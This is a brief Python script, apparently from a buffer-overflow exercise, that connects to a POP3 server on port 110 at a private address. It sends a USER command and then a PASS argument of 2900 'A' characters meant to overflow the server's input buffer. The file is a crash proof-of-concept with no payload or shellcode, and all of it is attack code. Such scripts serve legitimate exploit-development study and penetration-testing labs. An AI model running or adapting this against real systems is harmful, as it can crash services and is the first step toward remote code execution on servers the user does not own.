#!/usr/bin/python3

import sys
import socket
buffer=2900
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.1.2',110))
s.send((b'USER TEST\r\n'))
s.send((b'PASS ' + b"A" * buffer + b'\r\n'))
s.close()
